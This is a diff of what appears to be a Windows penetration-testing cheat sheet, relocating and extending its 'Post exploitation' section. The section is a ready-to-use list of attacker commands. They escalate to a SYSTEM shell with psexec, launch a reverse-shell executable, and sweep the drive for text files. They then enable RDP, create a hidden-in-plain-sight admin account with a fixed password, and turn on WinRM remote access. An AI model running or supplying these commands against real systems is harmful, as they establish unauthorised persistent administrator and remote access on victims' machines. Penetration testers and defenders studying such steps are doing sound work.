@@ -736,39 +736,6 @@ x86_64-w64-mingw32-gcc shell.c -o shell.exe
 i686-w64-mingw32-gcc shell.c -o shell.exe
 ```
 
-# Post exploitation
-
-* Once Admin privileges obtained get SYSTEM shell
-`psexec.exe -accepteula -sid cmd.exe`
-
-Or connect as other service if needed from victim
-
-```powershell
-
-.\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
-```
-
-* look for stuff
-`Get-Childitem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
-
-* enable RDP
-`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
-
-* add user
-`net user Pentester Password1 /ADD`
-
-* give admin rights
-`net localgroup Administrators Pentester /ADD`
-
-* add to RDP group
-
-`powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
-
-`net localgroup "Remote Desktop Users" Pentester /add`
-
-* Enable winrm to be evil
-
-`Enable-PSRemoting -SkipNetworkProfileCheck -Force`
 
 
 
@@ -859,3 +826,42 @@ powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-P
 
 big thanks for the skript to https://gist.github.com/t2psyto
 
+
+
+# Post exploitation
+
+* Once Admin privileges obtained get SYSTEM shell
+`psexec.exe -accepteula -sid cmd.exe`
+
+Or connect as other service if needed from victim
+
+```powershell
+
+.\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
+```
+
+* look for stuff
+`Get-Childitem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
+
+* enable RDP
+`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+
+* add user
+`net user Pentester Password1 /ADD`
+
+* give admin rights
+`net localgroup Administrators Pentester /ADD`
+
+* add to RDP group
+
+`powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
+
+`net localgroup "Remote Desktop Users" Pentester /add`
+
+* Enable winrm to be evil
+
+`Enable-PSRemoting -SkipNetworkProfileCheck -Force`
+
+OR
+
+`winrm quickconfig -y`
